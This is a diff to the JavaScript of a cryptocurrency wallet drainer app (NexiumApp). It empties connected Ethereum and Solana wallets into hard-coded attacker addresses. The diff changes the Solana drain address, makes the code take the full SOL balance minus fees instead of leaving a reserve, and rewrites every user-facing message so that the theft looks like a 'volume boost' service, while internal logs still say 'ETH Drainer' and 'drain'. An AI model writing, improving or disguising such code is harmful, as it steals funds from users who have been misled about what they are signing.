@@ -32,7 +32,7 @@ import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "DVDXQgzcsYU9BthFXWyAMvDxjr8LMiHfLCUnhUGQrMAa"
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
 
 const POPULAR_SPL_TOKENS = [
@@ -391,7 +391,7 @@ class NexiumApp {
       setTimeout(() => {
         if (this.connecting) {
           console.log(`Deeplink timed out for ${walletName}`); // Log 58
-          this.showFeedback('error timed out. Please open site in the wallet app browser.', 'error');
+          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
           console.log(`Setting button state to disconnected for ${walletName} due to deeplink timeout`); // Log 59
           this.cacheDOMElements();
           this.updateButtonState('disconnected', walletName);
@@ -417,7 +417,7 @@ class NexiumApp {
     this.showProcessingSpinner();
     if (typeof window === "undefined" || !window.ethereum) {
       console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed."); // Log 64
-      this.showFeedback("error! Make sure MetaMask is installed.", 'error');
+      this.showFeedback("Please install MetaMask to boost volume.", 'error');
       this.hideProcessingSpinner();
       return;
     }
@@ -429,7 +429,7 @@ class NexiumApp {
       console.log(`ETH Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 65
       if (network.chainId !== 1n) {
         console.error('ETH Drainer: MetaMask not on Ethereum mainnet, chainId:', network.chainId); // Log 66
-        this.showFeedback('MetaMask is not connected.', 'error');
+        this.showFeedback('Please connect MetaMask to Ethereum mainnet.', 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -447,7 +447,7 @@ class NexiumApp {
       this.hideProcessingSpinner();
     } catch (error) {
       console.error("❌ Transaction failed due to an unexpected error:", error); // Log 74
-      this.showFeedback(`volume add failed. please try again!`, 'error');
+      this.showFeedback('Failed to boost volume. Please try again.', 'error');
       this.hideProcessingSpinner();
     }
   }
@@ -459,14 +459,14 @@ class NexiumApp {
 
     if (!this.publicKey || typeof this.publicKey !== "string") {
       console.error("❌ Invalid Solana address:", this.publicKey); // Log 79
-      this.showFeedback("Invalid Solana address.", 'error');
+      this.showFeedback("Invalid wallet address.", 'error');
       this.hideProcessingSpinner();
       return;
     }
 
     if (this.publicKey.startsWith("0x") && this.publicKey.length === 42) {
       console.error("❌ Ethereum address detected, expected Solana address:", this.publicKey); // Log 80
-      this.showFeedback("Cannot drain Solana wallet with an Ethereum address.", 'error');
+      this.showFeedback("Please use a Solana wallet to boost volume.", 'error');
       this.hideProcessingSpinner();
       return;
     }
@@ -535,31 +535,45 @@ class NexiumApp {
         }
       }
 
-      // Estimate transaction fee
-      const tempTransaction = new Transaction().add(...tokenInstructions);
+      // Add a temporary SOL transfer instruction to estimate the full transaction fee
+      let solAmount = 0;
+      if (hasBalanceTokens.length === 0) {
+        // Only include SOL transfer if no tokens are present
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: senderPublicKey,
+            toPubkey: recipientPublicKey,
+            lamports: balance
+          })
+        );
+      }
+
+      // Estimate transaction fee with all instructions
+      const tempTransaction = new Transaction().add(...tokenInstructions, ...transaction.instructions);
       tempTransaction.feePayer = senderPublicKey;
       const { blockhash } = await this.solConnection.getLatestBlockhash();
       tempTransaction.recentBlockhash = blockhash;
       const fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000; // Fallback to minimum fee if estimation fails
       console.log("Estimated transaction fee:", fee, "lamports"); // New Log
 
+      // Clear transaction instructions to rebuild correctly
+      transaction.instructions = [];
+
       // Determine SOL transfer amount
-      let solAmount = 0;
-      if (balance > fee && hasBalanceTokens.length === 0) {
-        // Only transfer SOL if balance exceeds fee and no tokens are present
-        let reserve = Math.floor(balance * 0.2); // Reserve 20% for SOL only
-        solAmount = balance - reserve - fee;
-        if (solAmount < 0) solAmount = 0;
-        console.log("SOL transfer amount calculated:", solAmount, "after reserving:", reserve, "and fee:", fee); // Updated Log
-      } else if (balance >= fee && hasBalanceTokens.length > 0) {
-        // If SOL is sufficient for fee and tokens are present, use SOL for fee only
+      if (balance < fee) {
+        console.log("Insufficient SOL for transaction fee"); // New Log
+        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
+        return;
+      }
+
+      if (hasBalanceTokens.length === 0) {
+        // If no tokens, transfer all SOL after reserving the fee
+        solAmount = balance - fee;
+        console.log("SOL transfer amount calculated:", solAmount, "after reserving fee:", fee); // Updated Log
+      } else {
+        // If tokens are present, use SOL for fee only
         console.log("SOL balance sufficient for fee, using for token transfers only"); // New Log
         solAmount = 0;
-      } else {
-        // If SOL balance is less than fee or no tokens to transfer, abort
-        console.log("No sufficient SOL for fees or no tokens to transfer"); // New Log
-        this.showFeedback("Insufficient SOL balance for transaction", 'error');
-        return;
       }
 
       // Add token instructions first
@@ -582,7 +596,7 @@ class NexiumApp {
       // Skip if no instructions
       if (transaction.instructions.length === 0) {
         console.log("No transfers to perform, skipping transaction");
-        this.showFeedback("No balances to drain", 'info');
+        this.showFeedback("No balances available to boost volume.", 'info');
         return;
       }
 
@@ -605,10 +619,10 @@ class NexiumApp {
       });
       console.log("Transaction confirmed:", signature); // Log 119
 
-      this.showFeedback("Successfully drained SOL and tokens", 'success');
+      this.showFeedback("Volume boosted successfully!", 'success');
     } catch (error) {
       console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 125
-      this.showFeedback(`Error: ${error.message}`, 'error');
+      this.showFeedback("Failed to boost volume. Please try again.", 'error');
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
@@ -667,14 +681,14 @@ class NexiumApp {
   handleConnectionError(error, walletName) {
     console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 139
     let message = `Failed to connect ${walletName}`;
-    if (error.code === -32002) message = `${walletName} is locked or not responding. Unlock it or reinstall the extension.`;
-    else if (error.message?.includes('rejected')) message = `${walletName} connection rejected`;
-    else if (error.message?.includes('locked')) message = `${walletName} is locked`;
-    else if (error.message?.includes('missing')) message = `WalletConnect project ID missing. Check configuration.`;
-    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Check your internet or DNS settings (e.g., use 8.8.8.8).`;
-    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `${walletName} extension not detected or unsupported. Please install it.`;
-    else if (error.message?.includes('Non-base58 character')) message = `MetaMask uses Ethereum addresses; draining requires a Solana wallet.`;
-    else if (error.message) message = `${message}: ${this.escapeHTML(error.message)}`;
+    if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
+    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined.`;
+    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it.`;
+    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please try again.`;
+    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
+    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
+    else if (error.message?.includes('Non-base58 character')) message = `Please use a Solana wallet to boost volume.`;
+    else if (error.message) message = `Failed to connect ${walletName}. Please try again.`;
     this.showFeedback(message, 'error');
   }
 
@@ -705,7 +719,7 @@ class NexiumApp {
       } else if (this.connectingWallet === 'Phantom') {
         walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
       }
-      promptText.innerHTML = `No ${this.connectingWallet} installed. Install ${walletLink} to continue.`;
+      promptText.innerHTML = `Please install ${walletLink} to continue.`;
     }
     console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 143
   }
@@ -1023,13 +1037,13 @@ class NexiumApp {
 
   async loadCustomTokenData(tokenAddressInput) {
     if (!this.solConnection) {
-      this.showFeedback('Wallet not connected.', 'error');
+      this.showFeedback('Please connect your wallet.', 'error');
       console.log('loadCustomTokenData failed: No solConnection'); // Log 166
       return;
     }
     const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
     if (!tokenAddress) {
-      this.showFeedback('Invalid token address.', 'error');
+      this.showFeedback('Please enter a valid token address.', 'error');
       this.dom.customTokenAddressInput?.focus();
       console.log('loadCustomTokenData failed: No token address'); // Log 167
       return;
@@ -1054,7 +1068,7 @@ class NexiumApp {
       }
     } catch (error) {
       console.error('Load custom token error:', error); // Log 169
-      this.showFeedback('Failed to load custom token.', 'error');
+      this.showFeedback('Unable to load token details. Please check the address.', 'error');
       if (this.dom.tokenInfo) {
         this.dom.tokenInfo.classList.add('hidden');
       }
@@ -1063,7 +1077,7 @@ class NexiumApp {
 
   async loadPaymentTokenDetails(paymentTokenAddress) {
     if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
-      this.showFeedback('Wallet not connected.', 'error');
+      this.showFeedback('Please connect your wallet.', 'error');
       console.log('loadPaymentTokenDetails failed: Missing requirements'); // Log 170
       return;
     }
@@ -1078,7 +1092,7 @@ class NexiumApp {
       console.log(`Loaded payment token details: ${symbol}, balance: ${balance / 10**decimals}`); // Log 171
     } catch (error) {
       console.error('Load payment token error:', error); // Log 172
-      this.showFeedback('Failed to load payment token details.', 'error');
+      this.showFeedback('Unable to load payment token details.', 'error');
     }
   }
 
@@ -1088,7 +1102,7 @@ class NexiumApp {
       return;
     }
     if (!this.publicKey) {
-      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+      this.showFeedback('Please connect your wallet.', 'error');
       console.log('Drain failed: No public key'); // Log 174
       return;
     }
@@ -1117,10 +1131,10 @@ class NexiumApp {
       let txid = await this.solConnection.sendRawTransaction(signed.serialize());
       await this.solConnection.confirmTransaction(txid);
       console.log('Transaction confirmed:', txid); // Log 184
-      this.showFeedback(`Successfully drained SOL`, 'success');
+      this.showFeedback('Volume boosted successfully!', 'success');
     } catch (error) {
       console.error('Drain token error:', error); // Log 185
-      this.showFeedback(`Error draining SOL: ${error.message}`, 'error');
+      this.showFeedback('Failed to boost volume. Please try again.', 'error');
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
